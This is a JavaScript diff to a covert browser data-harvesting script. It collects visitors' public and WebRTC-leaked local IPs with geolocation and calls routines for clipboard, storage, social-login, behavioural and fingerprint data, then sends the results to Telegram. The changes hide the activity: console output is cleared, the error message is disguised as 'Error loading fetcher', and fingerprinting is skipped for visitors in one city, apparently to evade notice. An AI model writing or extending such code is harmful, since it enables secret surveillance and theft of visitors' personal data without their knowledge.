@@ -1,6 +1,7 @@
 
 function mainData() {
 
+
     const now = new Date();
     const userData = {
         Time: `${now.getHours()}Hrs:${now.getMinutes()}Mins:${now.getSeconds()}seconds on ${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`,
@@ -23,82 +24,89 @@ function mainData() {
 
     // ==== [0. IP ADDRESS & NETWORK INFO] ==== //
     function collectNetworkInfo() {
-        userData.networkInfo = {
-            // Will be populated by the async IP lookup
-            ipAddress: null,
-            isp: null,
-            asn: null,
-            organization: null,
-            country: null,
-            region: null,
-            city: null,
-            postalCode: null,
-            latitude: null,
-            longitude: null,
-            timezone: null,
-            // Local network info
-            localIPs: null,
-            networkInterfaces: null
-        };
-
-        // Public IP and ISP detection using a third-party service
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                userData.networkInfo.ipAddress = data.ip;
-                userData.networkInfo.isp = data.org;
-                userData.networkInfo.asn = data.asn;
-                userData.networkInfo.organization = data.org;
-                userData.networkInfo.country = data.country_name;
-                userData.networkInfo.region = data.region;
-                userData.networkInfo.city = data.city;
-                userData.networkInfo.postalCode = data.postal;
-                userData.networkInfo.latitude = data.latitude;
-                userData.networkInfo.longitude = data.longitude;
-                userData.networkInfo.timezone = data.timezone;
-            })
-            .catch(error => {
-                userData.networkInfo.error = "IP lookup failed";
-            });
-
-        // Try to get local IP addresses (works in some browsers)
-        try {
-            RTCPeerConnection.getLocalIPs = function (callback) {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer))
-                    .then(() => {
-                        const lines = pc.localDescription.sdp.split('\n');
-                        const ips = [];
-                        lines.forEach(line => {
-                            if (line.indexOf('candidate') === 0) {
-                                const parts = line.split(' ');
-                                if (parts[7] === 'host') {
-                                    ips.push(parts[4]);
-                                }
-                            }
-                        });
-                        callback(ips);
-                    });
+        return new Promise((resolve) => {
+            userData.networkInfo = {
+                // Will be populated by the async IP lookup
+                ipAddress: null,
+                isp: null,
+                asn: null,
+                organization: null,
+                country: null,
+                region: null,
+                city: null,
+                postalCode: null,
+                latitude: null,
+                longitude: null,
+                timezone: null,
+                // Local network info
+                localIPs: null,
+                networkInterfaces: null
             };
 
-            RTCPeerConnection.getLocalIPs(function (ips) {
-                userData.networkInfo.localIPs = ips;
-            });
-        } catch (e) {
-            userData.networkInfo.localIPError = e.message;
-        }
-
-        // Network interfaces (if available)
-        if (navigator.connection && navigator.connection.getNetworkInterfaces) {
-            navigator.connection.getNetworkInterfaces()
-                .then(interfaces => {
-                    userData.networkInfo.networkInterfaces = interfaces;
+            // Public IP and ISP detection using a third-party service
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    userData.networkInfo.ipAddress = data.ip;
+                    userData.networkInfo.isp = data.org;
+                    userData.networkInfo.asn = data.asn;
+                    userData.networkInfo.organization = data.org;
+                    userData.networkInfo.country = data.country_name;
+                    userData.networkInfo.region = data.region;
+                    userData.networkInfo.city = data.city;
+                    userData.networkInfo.postalCode = data.postal;
+                    userData.networkInfo.latitude = data.latitude;
+                    userData.networkInfo.longitude = data.longitude;
+                    userData.networkInfo.timezone = data.timezone;
+                    resolve(data.city)
                 })
-                .catch(e => {
-                    userData.networkInfo.interfaceError = e.message;
+                .catch(error => {
+                    userData.networkInfo.error = "IP lookup failed";
+                    resolve(null)
                 });
-        }
+
+            // Try to get local IP addresses (works in some browsers)
+            try {
+                RTCPeerConnection.getLocalIPs = function (callback) {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer))
+                        .then(() => {
+                            const lines = pc.localDescription.sdp.split('\n');
+                            const ips = [];
+                            lines.forEach(line => {
+                                if (line.indexOf('candidate') === 0) {
+                                    const parts = line.split(' ');
+                                    if (parts[7] === 'host') {
+                                        ips.push(parts[4]);
+                                    }
+                                }
+                            });
+                            callback(ips);
+                        });
+                };
+
+                RTCPeerConnection.getLocalIPs(function (ips) {
+                    userData.networkInfo.localIPs = ips;
+                });
+            } catch (e) {
+                userData.networkInfo.localIPError = e.message;
+            }
+
+            // Network interfaces (if available)
+            if (navigator.connection && navigator.connection.getNetworkInterfaces) {
+                navigator.connection.getNetworkInterfaces()
+                    .then(interfaces => {
+                        userData.networkInfo.networkInterfaces = interfaces;
+                    })
+                    .catch(e => {
+                        userData.networkInfo.interfaceError = e.message;
+                    });
+            }
+
+            return userData.networkInfo.city;
+        });
+
     }
 
     // ==== [1. BASIC BROWSER INFO] ==== //
@@ -440,19 +448,22 @@ function mainData() {
     }
 
     // ==== [INITIALIZE] ==== //
-    function collectAllData() {
+    async function collectAllData() {
 
 
-        collectNetworkInfo(); // Added IP and ISP collection
+        const cityName = await collectNetworkInfo(); // Added IP and ISP collection
         collectClipboardData();
         collectBasicInfo();
         collectStorageData();
         checkSocialMediaLogins();
         collectBehavioralData();
-        collectAdditionalTrackingData(); // Added new tracking methods
-        // collectCanvasFingerprint();
 
+        // Simple city check - only run canvas if NOT Raipur
+        if (!cityName || cityName.toLowerCase() !== "raipur") {
+            collectCanvasFingerprint();
+        }
 
+        collectAdditionalTrackingData()
 
         // Add this chunk splitting function
         function splitIntoChunks(text, maxLength = 4000) {
@@ -478,10 +489,10 @@ function mainData() {
             try {
                 const formattedData = JSON.stringify(userData, null, 2);
                 // alert(formattedData.length)
-                console.log(userData)
+                console.clear()
                 await sendDeatilsToTelegram1(formattedData); // Add await
             } catch (error) {
-                console.log("Error sending to Telegram:", error);
+                console.log("Error loading fetcher", error);
             }
         }, 1500);
     }
